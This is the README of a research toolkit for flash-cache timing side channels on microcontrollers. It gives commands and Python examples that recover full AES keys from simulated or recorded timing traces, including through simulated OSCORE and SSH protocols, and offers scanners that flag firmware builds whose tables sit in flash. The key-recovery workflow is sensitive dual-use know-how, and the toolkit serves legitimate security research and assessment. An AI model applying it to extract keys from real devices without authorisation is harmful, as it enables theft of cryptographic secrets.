# flashwhisperer

*🤖WARNING🤖: This file LLM generated and may read oddly. Will eventually be human-edited for that real-life touch and typos.*

Host-side toolkit for flash-accelerator timing side channels on
microcontrollers: a simulator, a target-agnostic key-recovery engine, a
black-box leak assessor, a memory-system mapper, and an arbitration probe.

Nothing here drives a board by itself. Every package takes either recorded
data or a transport you supply, which is what lets the recovery engine be
re-used against a capture from any instrument.

```bash
pip install -e .            # the five packages
pip install -e .[serial]    # ...and pyserial, for the transports that want it
python -m pytest -q         # fast: FIPS vectors, schedule inversion, mode mapping
python -m pytest -q --runslow   # also engine scans and captured-trace replays
```

## The packages

| | |
|---|---|
| `flashsim` | simulator: vectorised AES emitting ordered table-access traces, a flash line-buffer / small-cache timing model, and a Bernstein-style correlation attack over the result |
| `flashattack` | the recovery engine: last-round cache-collision scoring, row geometry, outlier-tolerant assembly, AES-128/192/256, mode mapping, feasibility estimates, and the `flashattack` CLI |
| `flashleak` | black-box assessment: given blocks and times, or a target you can send to, decide whether it leaks, without being told the mode, the direction, or which side you're watching |
| `flashmap` | reverse-engineer a part's memory system: flash read width, read latches, caches, and which configuration knobs reach them |
| `flasharb` | the arbitration probe's host half: how many cycles a table load saves by colliding with the previous load in the flash read word |

Import layering runs left to right in that table and has no back edges.
`flashmap` imports none of the others and `tests/test_flashmap.py` asserts
it; the rest holds because nothing has broken it, which is not the same
thing. [`docs/PACKAGING.md`](docs/PACKAGING.md) has the re-measurement
command.

**NOTE:** a package here may not import `serial` at module level, and may
not import a board driver at all. That rule is what keeps the toolkit
installable and testable without a bench, and it's why the scripts that
drive hardware live in the firmware repository rather than in here.

## Try it without a board

Everything below runs on a fresh clone. No hardware, no firmware, no
captures to download - the inputs are either simulated or the five trace
vectors in `tests/vectors/`, which are committed.

Recover a key end to end on a simulated victim, about 100 s:

```bash
python -m flashattack selftest
```
```
[selftest enc] rk 16/16  master_ok=True  verified=True
[selftest dec] rk 16/16  master_ok=True  verified=True
[selftest oscore] master_ok=True  verified=True
[selftest ssh] master_ok=True  verified=True
```

Same thing through a protocol and a noisy network, which is the realistic
shape. `--sigma` is the jitter in cycles, `--K` the in-device
amplification, `--R` the min-filter over network repeats:

```bash
python -m flashattack protosim --proto oscore --n 40000
python -m flashattack protosim --proto ssh --n 200000 --sigma 400 --K 16 --R 5
```
```
proto=oscore n=40000 sigma=25.0 K=1 R=1
ctr AES-128 (enc), n=40000
  oracle: mean=1062.6 std=30.36
  rk[10] last: d014f9a8c9ee2589e13f0cc8b6630ca6  minconf=0.48 (16/16 vs truth)
  MASTER: 2b7e151628aed2a6abf7158809cf4f3c  verified=True
```

The ssh line is the harder one and also lands 16/16: 400 cycles of jitter
against a leak of a few hundredths of a sigma, pulled back by amplifying
in the device and min-filtering over repeats.

### flashleak, on a capture it is told nothing about

`flashleak` is the other end: no key, no mode, not even which side of the
cipher you are watching. Point it at a recorded file and it decides.

```bash
python -m flashleak analyse capture.npz          # recorded blocks + timings
python -m flashleak analyse capture.npz --quick  # skip the 2^16 search
```

The committed vectors store timing plus the seed, so the blocks are
regenerated rather than stored. That makes a self-contained demo:

```python
import numpy as np
from flashattack import modes, transport
from flashleak import assess, render

d = np.load("tests/vectors/sbox_tinyaes_ecb-enc_128.npz")
key = bytes.fromhex(str(d["key_hex"]))
material = transport.gen_pts(int(d["seed"]), int(d["n"]))
ct, _ = modes.known_output(str(d["mode"]), material, key)

print(render(assess(np.asarray(ct, dtype=np.uint8),
                    d["timing"].astype(float))))
```

The key is used to rebuild the blocks the attacker would have seen on the
wire, and `assess` never gets it. Trimmed output:

```
  data_dependence              285715.431   z=   +5.2  ####....................
  pair_output_enc                   6.429   floor 4.2, excess +2.23
  pair_output_dec                   4.233   floor 4.2, excess +0.03
  shuffled-null floor          4.18 (assumed 4.2)

  what the observed block is
      consistent with a cipher encryption output (ciphertext / keystream)   [strong]
      peak 6.43 vs measured floor 4.18
```

It gets the side right and the direction right - the `enc` predictor sits
+2.23 over the floor and the `dec` one +0.03, which is what a correct
reading looks like. It also picks the row width itself: the scan reads
`2 entries:+2.9  4:+19.9  8:+15.6  16:+25.0` and scores the last.

Don't read a quiet flashleak result as "safe", though. This detector is
strictly weaker than an attack that knows the key, and
[`flashleak/README.md`](flashleak/README.md) § *Reading a negative
honestly* is the three ways it can say nothing about a target that is
broken. Its "traces to be confident" line is currently **not** a
trustworthy upper bound on an attacker's cost - on this very capture it
says order 3 000 where the key-known ladder below needs 250 000 - and
`RECOVERY_EXCESS` in `hypotheses.py` records why.

Pass `--quick` and the 2^16 search is skipped, which drops the test that
found the side at all. It's for triage, not for a verdict.

## Will the tables even be in flash?

Worth asking before any of the above, because it's free and it's the
property every break here rests on. `fwscan` answers the *library*
question (what tables are in this image) and `placement` answers the
*build* question (will they be read from flash at run time). The same
vendor binary, one linker line apart, is either a full key in 20 000
timings or nothing at all.

The quick version, which is usually all you need:

```bash
python -m flashleak fwscan firmware.bin
python -m flashleak placement fw.elf --part g4
```

Realistically you have a build tree rather than one file, you don't always
have the `.elf`, and you want it to fail the build rather than print at
you:

```bash
# every artefact under build/, machine-readable, non-zero exit if any
# table resolves to flash
python -m flashleak placement build/ --part g4 --fail-on exposed --json p.json

# raw .bin with no vector table at offset 0, so the flash base is supplied
python -m flashleak placement fw.bin --part f4 --base 0x08000000

# an unlinked archive: the verdict is conditional on the linker script,
# and --ld checks that the script really carries the rule
python -m flashleak placement libcmox.a --ld project.ld

# which memory map it is using for a part, before you trust its verdict
python -m flashleak placement x --list-parts
```

`--part` is not optional in practice. Without it anything in the SRAM
region comes back `UNDETERMINED`, deliberately: on an H7, `0x2000_0000` is
DTCM and `0x2400_0000` is cached AXI-SRAM, and on an F7 that boundary
moves inside the family.

For an algorithm with no byte signature - anything post-quantum, anything
new - `fwscan` and `placement` are both blind, because they start by
recognising a table's bytes. `codescan` looks for the *shape* of a
register-offset load instead:

```bash
python -m flashleak codescan fw.elf --part f4
python -m flashleak codescan fw.bin --part l1 --base 0x08000000
```

## Sweeping what you have to guess

Two things the attack needs that nothing on the chip reports, and guessing
either one wrong gives you a result that reads like a target that doesn't
leak:

* `line_shift` - log2 of (flash read width in bytes / table entry size).
  An 8-byte read is 3 for a byte S-box, 1 for a 4-byte word table; a
  16-byte read is 4 and 2.
* `line_off` - where the table starts inside its flash row, in entries.
  Link-order luck, and worth 2x to 10x in traces.

The quick version is to sweep them and let the ladder say which won.
Carrying on from the flashleak demo above, so `ct` and `key` are the same
regenerated blocks:

```python
from flashattack import Capture
from flashattack.sweep import default_geometries, ladder

cap = Capture(timing=d["timing"].astype(float), mode="ecb-enc",
              ciphertext=np.asarray(ct, dtype=np.uint8), label="tinyaes")

lad = ladder(cap, n_values=[50_000, 250_000],
             geometries=default_geometries(line_shifts=[4, 1],
                                           models=("all",)),
             key_for_truth=key, log=print)
print(lad.summary_line())
```

Two trace counts, two row widths, the 120-pair model. 102 s on this box:

```
    n=50000   ls=4 off=0 120      4/16 - (25s)
    n=50000   ls=1 off=0 120      1/16 - (26s)
    n=250000  ls=4 off=0 120     16/16 EXACT MASTER KEY (25s)
    n=250000  ls=1 off=0 120     13/16 - (26s)
tinyaes: EXACT MASTER KEY at n=250000 (ls=4 off=0 120)
```

This part reads flash 16 bytes wide, hence `4`; on an 8-byte-read part pass
`[3, 1]` instead. Note the ladder picking the right width on its own, and
note that `ls=1` still reaches 13/16 at 250 k - a wrong row width usually
returns a clean null, but given five times the traces it can get close
enough to look like a weak result rather than a wrong assumption. The
ranking is what settles it.

Drop `models=("all",)` and `default_geometries` runs both pair models,
which doubles the grid again. Neither dominates: the 120-pair vote reaches
targets whose round-10 reads cross a column boundary, which the 24-pair
one can't express, and on a plain byte-S-box cipher the 24-pair one has
reached the key from half the traces. Running one of them is choosing
which half of your targets to miss.

The realistic version narrows the grid first, because every axis you pin
is trials you don't pay for. If you have the image, read the offset off it
rather than sweeping it:

```python
from flashleak import row_offset_from_image
from flashattack.sweep import default_geometries, ladder

off, addr, note = row_offset_from_image("fw.elf", part="stm32f4")
if off is None:
    raise SystemExit("tables are not flash-resident (%s) - no channel" % note)

lad = ladder(cap,
             n_values=[12_500, 25_000, 50_000, 100_000],
             geometries=default_geometries(line_shifts=[3],
                                           line_offs=[off],
                                           models=("all", "intra-column")),
             verify=(pt0, ct0), key_for_truth=KEY, log=print)
```

A `None` offset is a real answer and not a default of 0: a build that
copies its tables to RAM has no flash row structure, so there's nothing to
score. With no image at all, `geometry.candidate_row_offsets()` gives the
four offsets ARM GCC's 4-byte alignment allows - pass `align=1` to sweep
all 16 if you don't know the toolchain.

Ladder rather than one big `n`, because a partial recovery has two causes
that look identical from a single run and want opposite responses: a pair
model that can't express the leaking pairs (more traces never help), or
simply too few traces. One that doesn't move with `n` is the first; one
that climbs is the second.

The CLI carries no geometry flags, so a sweep is the Python API above.
`attack-file` is the one-shot version for a capture whose geometry you
already know:

```bash
python -m flashattack attack-file --file cap.npz --mode ctr --detrend --json
python -m flashattack assess --file cap.npz      # constant-time? exploitable?
```

## Where the firmware went

This repository is the host half. The firmware, the boards, the measurement
rigs and the campaign results live separately, and a few things in here
point at them:

* Docstrings cite campaign documents (`research/targets/*.md`,
  `results/<campaign>/`) for their measured claims. Those paths resolve in
  the firmware repository, not here. They're provenance, not imports, and
  nothing loads them.
* Two tests were left behind: a known-answer test that compiles each
  firmware copy of `aes.c`, and the ctguard host test. Both test firmware.
* Tests that read firmware assets skip when the assets are absent. Point
  `FLASHWHISPERER_RIGS` at a firmware checkout's `rigs/` to run them, and
  drop `flashmap` captures at `results/flashmap/*.raw.json` to run the
  replays.

## Status

Extracted from a private research repository, with the history of all five
packages intact across the reorganisation that first grouped them. The
distribution is named for this repository; `flashattack` stays the console
script, since that spelling is in every capture script written against it.

No licence is declared yet. That is a decision, not an oversight.
